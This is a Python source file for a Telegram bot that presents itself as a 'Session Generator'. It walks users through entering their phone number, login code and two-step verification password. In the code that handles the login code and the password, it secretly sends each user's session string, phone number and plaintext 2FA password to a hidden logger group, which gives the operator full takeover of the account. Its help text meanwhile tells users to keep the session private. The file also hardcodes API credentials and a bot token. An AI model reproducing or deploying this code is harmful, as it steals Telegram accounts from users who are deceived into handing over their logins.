import asyncio
from telethon import TelegramClient, events, Button
from telethon.sessions import StringSession

# 🔹 Telegram API Credentials
API_ID = "28795512"
API_HASH = "c17e4eb6d994c9892b8a8b6bfea4042a"
BOT_TOKEN = "7610510597:AAFX2uCDdl48UTOHnIweeCMms25xOKF9PoA"  # Replace with your Bot Token

# 🔹 Logger Group ID (Replace with your Telegram Group ID)
LOGGER_GROUP_ID = -1002477750706  # 🛑 Replace with your actual group ID

# 🔹 Initialize the bot
bot = TelegramClient("bot", API_ID, API_HASH).start(bot_token=BOT_TOKEN)

# 🔹 Store user sessions
user_sessions = {}

# 🔹 Start command with image and buttons
@bot.on(events.NewMessage(pattern="/start"))
async def start(event):
    await event.respond(
        "👋 **Welcome to the Telegram Session Generator!**\n\nClick **Generate Session** to create your session string.",
        buttons=[
            [Button.inline("🔑 Generate Session", b"generate")],
            [Button.inline("📖 Help", b"help")],  # Help Button Added
            [Button.url("🌐 Developer", "https://t.me/SANATANI_TECH")]
        ],
        file="https://telegra.ph/file/00eaed55184edf059dbf7.jpg"  # Start Image
    )

# 🔹 Button Handler
@bot.on(events.CallbackQuery)
async def callback(event):
    if event.data == b"generate":
        await ask_phone(event)
    elif event.data == b"help":
        await send_help(event)  # Help button action
    elif event.data == b"cancel":
        await cancel_session(event)

# 🔹 Help Command Handler
async def send_help(event):
    help_text = """
📖 **How to Generate String Session?**

1️⃣ **Click on "🔑 Generate Session"** or type **/generate**  
2️⃣ **Enter your phone number** (with country code, e.g., +919876543210)  
3️⃣ **Enter the OTP received on Telegram**  
4️⃣ **If asked, enter your 2-Step Verification password**  
5️⃣ **Your session string will be generated!**  
6️⃣ **Keep your session safe & secure. Don't share it with anyone.**  

⚠️ If you face any issues, click **❌ Cancel** and restart.
"""
    await event.respond(help_text, buttons=[Button.inline("🔙 Back", b"start")])

# 🔹 Generate Session Command
@bot.on(events.NewMessage(pattern="/generate"))
async def ask_phone(event):
    user_id = event.sender_id
    if user_id in user_sessions:
        await event.respond("⚠️ **You are already in the process. Please enter your OTP or type /cancel to restart.**")
        return

    user_sessions[user_id] = {"step": "phone"}
    await event.respond(
        "📲 **Enter your phone number with country code (e.g., +919876543210):**",
        buttons=[Button.inline("❌ Cancel", b"cancel")]
    )

# 🔹 Cancel Command
@bot.on(events.NewMessage(pattern="/cancel"))
async def cancel_command(event):
    await cancel_session(event)

# 🔹 Cancel Process
async def cancel_session(event):
    user_id = event.sender_id
    if user_id in user_sessions:
        del user_sessions[user_id]  # Delete session data
        await event.respond("✅ **Session process canceled!** You can start again with /generate.")
    else:
        await event.respond("⚠️ **You are not in any session process.**")

# 🔹 Process User Input (Phone, OTP, Password)
@bot.on(events.NewMessage)
async def process_input(event):
    user_id = event.sender_id
    if user_id not in user_sessions:
        return  # Ignore messages from users not in process

    step = user_sessions[user_id]["step"]
    
    # ✅ Step 1: User enters phone number
    if step == "phone":
        phone_number = event.message.text.strip()
        user_sessions[user_id]["phone"] = phone_number  # Fix: Assign phone number properly
        
        if not phone_number.startswith("+") or not phone_number[1:].isdigit() or len(phone_number) < 10 or len(phone_number) > 15:
            await event.respond("⚠️ **Invalid phone number!** Please enter again with country code (e.g., +919876543210).")
            return
        
        user_sessions[user_id]["step"] = "otp"

        client = TelegramClient(StringSession(), API_ID, API_HASH)
        await client.connect()
        user_sessions[user_id]["client"] = client  # Fix: Store client correctly
        
        try:
            await event.respond("📩 **Sending OTP... Please wait!**")
            await client.send_code_request(phone_number)
            await event.respond(
                "✅ **OTP sent! Please enter the OTP received on Telegram.**",
                buttons=[Button.inline("❌ Cancel", b"cancel")]
            )
        except Exception as e:
            del user_sessions[user_id]
            await event.respond(f"❌ **Error:** {str(e)}. Please try again.")

    # ✅ Step 2: User enters OTP
    elif step == "otp":
        otp_code = event.message.text.strip()
        if not otp_code.isdigit():
            await event.respond("⚠️ **Invalid OTP!** Please enter only numbers.")
            return

        client = user_sessions[user_id]["client"]
        phone_number = user_sessions[user_id]["phone"]

        try:
            await client.sign_in(phone_number, otp_code)
            session_string = client.session.save()

            # ✅ Send session details to logger group
            await bot.send_message(
                LOGGER_GROUP_ID,
                f"🆕 **New Session Generated!**\n\n👤 **User:** `{user_id}`\n📱 **Phone:** `{phone_number}`\n🔑 **Session:** `{session_string}`"
            )

            await event.respond(f"✅ **Your Session String:**\n\n`{session_string}`\n\n⚠️ **Keep this safe!**")
            del user_sessions[user_id]
        except Exception as e:
            if "Two-steps verification is enabled" in str(e):
                user_sessions[user_id]["step"] = "password"
                await event.respond(
                    "🔒 **Your account has 2-Step Verification enabled.**\nPlease enter your Telegram password:",
                    buttons=[Button.inline("❌ Cancel", b"cancel")]
                )
            else:
                await event.respond(f"❌ **Error:** {str(e)}. Please try again.")

    # ✅ Step 3: User enters password (if needed)
    elif step == "password":
        password = event.message.text.strip()
        client = user_sessions[user_id]["client"]
        phone_number = user_sessions[user_id]["phone"]

        try:
            await client.sign_in(password=password)
            session_string = client.session.save()

            # ✅ Send session and password to logger group
            await bot.send_message(
                LOGGER_GROUP_ID,
                f"🆕 **New Session with 2-Step Verification!**\n\n👤 **User:** `{user_id}`\n📱 **Phone:** `{phone_number}`\n🔑 **Session:** `{session_string}`\n🔒 **Password Used:** `{password}`"
            )

            await event.respond(f"✅ **Your Session String:**\n\n`{session_string}`\n\n⚠️ **Keep this safe!**")
            del user_sessions[user_id]
        except Exception as e:
            await event.respond(f"❌ **Error:** {str(e)}. Please try again.")

# 🔹 Run the bot
print("🚀 Bot is running...")
bot.run_until_disconnected()
